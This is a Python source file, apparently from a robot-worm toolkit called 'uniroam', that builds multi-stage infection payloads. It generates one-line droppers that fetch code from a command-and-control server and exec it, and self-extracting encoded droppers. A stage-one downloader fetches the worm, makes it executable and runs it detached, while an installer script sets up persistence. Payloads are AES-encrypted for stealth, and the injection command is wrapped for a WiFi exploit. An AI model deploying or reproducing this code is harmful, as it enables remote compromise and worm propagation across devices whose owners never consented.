#!/usr/bin/env python3
"""
Payload Builder for Multi-Stage Infection
Creates and encodes payloads for worm propagation
"""

import base64
import gzip
import json
from typing import Optional, Dict
from pathlib import Path
from uniroam import config

# ============================================================================
# Stage 0: Minimal Dropper
# ============================================================================

class Stage0Builder:
    """Build minimal dropper payload for initial injection"""
    
    @staticmethod
    def build_dropper(c2_url: str, robot_id: Optional[str] = "unknown") -> str:
        """
        Build Stage 0 dropper command
        
        Args:
            c2_url: C2 server URL
            robot_id: Robot identifier
        
        Returns:
            Injection-ready command string
        """
        # Minimal Python dropper that downloads Stage 1
        dropper = f"""python3 -c "import urllib.request as u,base64 as b;exec(u.urlopen('{c2_url}/api/v1/payload/stage1?id={robot_id}').read())" """
        
        return dropper
    
    @staticmethod
    def build_standalone_dropper(payload: str) -> str:
        """
        Build standalone dropper with embedded payload
        
        Args:
            payload: Python code to execute
        
        Returns:
            Injection-ready command string
        """
        # Compress and encode payload
        compressed = gzip.compress(payload.encode('utf-8'))
        encoded = base64.b64encode(compressed).decode('ascii')
        
        # Create self-extracting dropper
        dropper = f"""python3 -c "import gzip,base64;exec(gzip.decompress(base64.b64decode('{encoded}')))" """
        
        return dropper

# ============================================================================
# Stage 1: Full Agent Download
# ============================================================================

class Stage1Builder:
    """Build Stage 1 full agent payload"""
    
    @staticmethod
    def build_agent_downloader(c2_url: str, install_path: str = None) -> str:
        """
        Build Stage 1 agent downloader
        
        Args:
            c2_url: C2 server URL
            install_path: Where to install the agent
        
        Returns:
            Python code to download and execute full agent
        """
        if install_path is None:
            install_path = config.WORM_INSTALL_PATH
        
        stage1_code = f"""
import urllib.request
import subprocess
import os

# Download full agent
agent_url = '{c2_url}/api/v1/payload/full'
agent_path = '{install_path}'

try:
    # Download agent
    urllib.request.urlretrieve(agent_url, agent_path)
    os.chmod(agent_path, 0o755)
    
    # Execute agent
    subprocess.Popen(['/usr/bin/python3', agent_path], start_new_session=True)
except Exception as e:
    pass
"""
        return stage1_code
    
    @staticmethod
    def encode_stage1(code: str) -> bytes:
        """
        Encode Stage 1 for transmission
        
        Args:
            code: Python code
        
        Returns:
            Encoded payload
        """
        if config.PAYLOAD_COMPRESSION:
            compressed = gzip.compress(code.encode('utf-8'))
            encoded = base64.b64encode(compressed)
        else:
            encoded = base64.b64encode(code.encode('utf-8'))
        
        return encoded

# ============================================================================
# Stage 2: Full Worm Agent
# ============================================================================

class Stage2Builder:
    """Build complete worm agent package"""
    
    @staticmethod
    def build_worm_package(worm_path: str = None) -> bytes:
        """
        Package complete worm for deployment
        
        Args:
            worm_path: Path to worm_agent.py
        
        Returns:
            Packaged worm as bytes
        """
        if worm_path is None:
            worm_path = "worm_agent.py"
        
        try:
            with open(worm_path, 'rb') as f:
                worm_code = f.read()
            
            if config.PAYLOAD_COMPRESSION:
                return gzip.compress(worm_code)
            else:
                return worm_code
        
        except FileNotFoundError:
            return b""
    
    @staticmethod
    def create_installer_script(c2_url: str) -> str:
        """
        Create installer script for worm agent
        
        Args:
            c2_url: C2 server URL
        
        Returns:
            Installer script as string
        """
        installer = f"""#!/usr/bin/env python3
# Worm Agent Installer

import sys
import os

# Configuration
C2_URL = "{c2_url}"
INSTALL_PATH = "{config.WORM_INSTALL_PATH}"

def main():
    # Download and install worm
    import urllib.request
    
    worm_url = C2_URL + "/api/v1/payload/full"
    
    try:
        urllib.request.urlretrieve(worm_url, INSTALL_PATH)
        os.chmod(INSTALL_PATH, 0o755)
        
        # Establish persistence
        import subprocess
        subprocess.run(['/usr/bin/python3', INSTALL_PATH, '--install'], check=True)
        
        print("[+] Installation complete")
    except Exception as e:
        print(f"[-] Installation failed: {{e}}")
        sys.exit(1)

if __name__ == "__main__":
    main()
"""
        return installer

# ============================================================================
# Payload Encryption
# ============================================================================

class PayloadEncryption:
    """Encrypt payloads for OpSec"""
    
    @staticmethod
    def encrypt_payload(payload: bytes, key: bytes = None) -> bytes:
        """
        Encrypt payload for secure transmission
        
        Args:
            payload: Raw payload
            key: Encryption key (uses AES key if None)
        
        Returns:
            Encrypted payload
        """
        if key is None:
            key = config.AES_KEY
        
        from Cryptodome.Cipher import AES
        from Cryptodome.Random import get_random_bytes
        
        # Generate random IV
        iv = get_random_bytes(16)
        
        # Pad payload to AES block size
        padding_length = 16 - (len(payload) % 16)
        padded_payload = payload + bytes([padding_length] * padding_length)
        
        # Encrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(padded_payload)
        
        # Return IV + encrypted data
        return iv + encrypted
    
    @staticmethod
    def decrypt_payload(encrypted_payload: bytes, key: bytes = None) -> bytes:
        """
        Decrypt payload
        
        Args:
            encrypted_payload: Encrypted payload (IV + data)
            key: Decryption key
        
        Returns:
            Decrypted payload
        """
        if key is None:
            key = config.AES_KEY
        
        from Cryptodome.Cipher import AES
        
        # Extract IV and encrypted data
        iv = encrypted_payload[:16]
        encrypted = encrypted_payload[16:]
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(encrypted)
        
        # Remove padding
        padding_length = decrypted[-1]
        return decrypted[:-padding_length]

# ============================================================================
# Payload Manager
# ============================================================================

class PayloadManager:
    """Manage all payload stages"""
    
    def __init__(self, c2_url: str):
        """
        Initialize payload manager
        
        Args:
            c2_url: C2 server URL
        """
        self.c2_url = c2_url
    
    def generate_injection_command(self, robot_id: str = "unknown", standalone: bool = False) -> str:
        """
        Generate complete injection command for initial compromise
        
        Args:
            robot_id: Target robot identifier
            standalone: If True, embed full payload without C2 dependency
        
        Returns:
            Command string ready for injection
        """
        if standalone:
            # Build standalone payload with embedded Stage 1
            stage1_code = Stage1Builder.build_agent_downloader(self.c2_url)
            injection_cmd = Stage0Builder.build_standalone_dropper(stage1_code)
        else:
            # Build dropper that fetches from C2
            injection_cmd = Stage0Builder.build_dropper(self.c2_url, robot_id)
        
        return injection_cmd
    
    def get_stage1_payload(self) -> bytes:
        """
        Get Stage 1 payload for C2 distribution
        
        Returns:
            Encoded Stage 1 payload
        """
        code = Stage1Builder.build_agent_downloader(self.c2_url)
        return Stage1Builder.encode_stage1(code)
    
    def get_full_worm(self) -> bytes:
        """
        Get full worm package for C2 distribution
        
        Returns:
            Complete worm agent
        """
        return Stage2Builder.build_worm_package()
    
    def get_installer_script(self) -> str:
        """
        Get standalone installer script
        
        Returns:
            Installer script
        """
        return Stage2Builder.create_installer_script(self.c2_url)
    
    def save_payloads(self, output_dir: str = "payloads"):
        """
        Save all payloads to disk
        
        Args:
            output_dir: Directory to save payloads
        """
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        # Save Stage 0 dropper
        stage0 = self.generate_injection_command()
        with open(output_path / "stage0_dropper.sh", 'w') as f:
            f.write(f"#!/bin/bash\n{stage0}\n")
        
        # Save Stage 1
        stage1 = self.get_stage1_payload()
        with open(output_path / "stage1.b64", 'wb') as f:
            f.write(stage1)
        
        # Save installer
        installer = self.get_installer_script()
        with open(output_path / "installer.py", 'w') as f:
            f.write(installer)
        
        # Save full worm (if available)
        try:
            full_worm = self.get_full_worm()
            if full_worm:
                with open(output_path / "worm_agent.bin", 'wb') as f:
                    f.write(full_worm)
        except:
            pass

# ============================================================================
# Payload Testing
# ============================================================================

class PayloadTester:
    """Test payloads without actual deployment"""
    
    @staticmethod
    def test_stage0(c2_url: str = "http://localhost:8443"):
        """Test Stage 0 dropper generation"""
        builder = Stage0Builder()
        dropper = builder.build_dropper(c2_url, "test_robot")
        
        print("[+] Stage 0 Dropper:")
        print(f"    Length: {len(dropper)} bytes")
        print(f"    Command: {dropper[:100]}...")
        
        return len(dropper) < 500  # Should be minimal
    
    @staticmethod
    def test_stage1():
        """Test Stage 1 generation"""
        builder = Stage1Builder()
        code = builder.build_agent_downloader("http://localhost:8443")
        encoded = builder.encode_stage1(code)
        
        print("[+] Stage 1 Payload:")
        print(f"    Raw length: {len(code)} bytes")
        print(f"    Encoded length: {len(encoded)} bytes")
        print(f"    Compression ratio: {len(encoded)/len(code):.2%}")
        
        return True
    
    @staticmethod
    def test_encryption():
        """Test payload encryption"""
        test_payload = b"Test worm payload data"
        
        encrypted = PayloadEncryption.encrypt_payload(test_payload)
        decrypted = PayloadEncryption.decrypt_payload(encrypted)
        
        print("[+] Encryption Test:")
        print(f"    Original: {len(test_payload)} bytes")
        print(f"    Encrypted: {len(encrypted)} bytes")
        print(f"    Decrypted: {len(decrypted)} bytes")
        print(f"    Match: {test_payload == decrypted}")
        
        return test_payload == decrypted
    
    @staticmethod
    def run_all_tests():
        """Run all payload tests"""
        print("="*60)
        print("Payload Builder Test Suite")
        print("="*60)
        
        tests = {
            "Stage 0": PayloadTester.test_stage0,
            "Stage 1": PayloadTester.test_stage1,
            "Encryption": PayloadTester.test_encryption
        }
        
        results = {}
        for name, test_func in tests.items():
            try:
                results[name] = test_func()
                status = "PASS" if results[name] else "FAIL"
                print(f"\n[{status}] {name} test")
            except Exception as e:
                results[name] = False
                print(f"\n[FAIL] {name} test: {e}")
        
        print("\n" + "="*60)
        print(f"Tests passed: {sum(results.values())}/{len(results)}")
        print("="*60)
        
        return all(results.values())

# ============================================================================
# Convenience Functions
# ============================================================================

def build_injection_payload(c2_url: str, robot_id: str = "unknown") -> str:
    """
    Quick function to build injection payload
    
    Args:
        c2_url: C2 server URL
        robot_id: Robot identifier
    
    Returns:
        Injection command wrapped for WiFi exploit
    """
    manager = PayloadManager(c2_url)
    injection_cmd = manager.generate_injection_command(robot_id)
    
    # Wrap in WiFi injection syntax
    return config.build_injection_payload(injection_cmd)

# ============================================================================
# Main (for testing)
# ============================================================================

if __name__ == "__main__":
    PayloadTester.run_all_tests()

